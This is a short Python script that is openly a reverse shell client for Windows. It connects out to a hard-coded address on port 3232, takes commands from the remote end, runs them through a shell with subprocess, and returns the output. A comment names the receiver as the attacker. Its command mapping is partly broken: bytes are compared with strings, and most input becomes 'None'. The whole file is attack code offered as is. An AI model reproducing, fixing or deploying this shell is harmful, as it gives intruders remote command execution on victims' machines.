#!/usr/bin/python

import socket
import subprocess, os

def getCommand(commandNum):
    if commandNum == b'1':
        return 'dir'
    if commandNum == b'2':
        return 'C:\Windows\System32\calc.exe'


HOST = "192.168.5.130"  #source ip
PORT = 3232 # source port on which server is listening

connexion_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connexion_socket.connect((HOST, PORT))
print("\n[*] Connected to " +HOST+ " on port " +str(PORT)+ ".\n")

while True:
	
	command = connexion_socket.recv(1024)
	print(command == b'dir')
	split_command = command.split()
	print("Received command : ")
	print(command)

	# if its quit, then break out and close socket
	if command == "quit":
		break

	if(command.split()[0] == "cd"):
			if len(command.split()) == 1:
				connexion_socket.send((os.getcwd()))
			elif len(command.split()) == 2:
				try:
					os.chdir(command.split()[1])
					connexion_socket.send(("Changed directory to " + os.getcwd()))
				except(WindowsError):
					connexion_socket.send(str.encode("No such directory : " +os.getcwd()))

	else:
		# do shell command
		command = str(getCommand(command))
		print("after convert")
		print(command)
		proc = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		# read output
		stdout_value = proc.stdout.read() + proc.stderr.read()
		print(stdout_value )
		# send output to source
		if(stdout_value != ""):
			connexion_socket.send(stdout_value)  # renvoit l'output  à l'attaquant
		else:
			connexion_socket.send(command+ " does not return anything")


connexion_socket.close()
